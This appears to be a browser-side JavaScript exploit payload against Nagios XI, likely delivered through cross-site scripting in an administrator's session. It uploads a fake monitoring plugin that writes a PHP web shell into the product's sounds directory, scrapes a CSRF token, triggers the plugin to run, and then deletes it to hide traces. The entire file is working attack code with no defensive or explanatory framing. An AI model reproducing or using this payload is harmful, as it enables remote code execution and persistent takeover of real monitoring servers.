var plugin_name = 'check_ws.sh';
var nsp = window.nsp_str || window.top.nsp_str; // we might be inside the iframe
// This payload assumes ubuntu 20.04
var plugin_payload = `
#!/bin/sh

echo '<?php echo system($_GET[1]); ?>' > /usr/local/nagiosxi/html/sounds/main.php
sed -i 's/off/on/g' /usr/local/nagiosxi/html/sounds/.htaccess
`;

// Upload plugin with the above payload
var fd = new FormData();
fd.append('upload', 1);
fd.append('nsp', nsp); 
fd.append('uploadedfile', new Blob([plugin_payload]), plugin_name);
fetch('/nagiosxi/admin/monitoringplugins.php', { method: 'POST', body: fd })
  .then(function() {
    // Now we need to grab the CSRF token
    return fetch('/nagiosxi/includes/components/ccm/index.php?cmd=insert&type=command');
  })
  .then(function(res) {
    return res.text();
  })
  .then(function(page) {
    // Extract token
    var found = page.match(/token" type="hidden" value="(\w+)"/);
    // Run plugin code
    return fetch(`/nagiosxi/includes/components/ccm/command_test.php?cmd=help&mode=help&plugin=${plugin_name}&token=${found[1]}`);
  })
  .then(function() {
    // clean up
    return fetch(`/nagiosxi/admin/monitoringplugins.php?delete=${plugin_name}&nsp=${nsp}`);
  });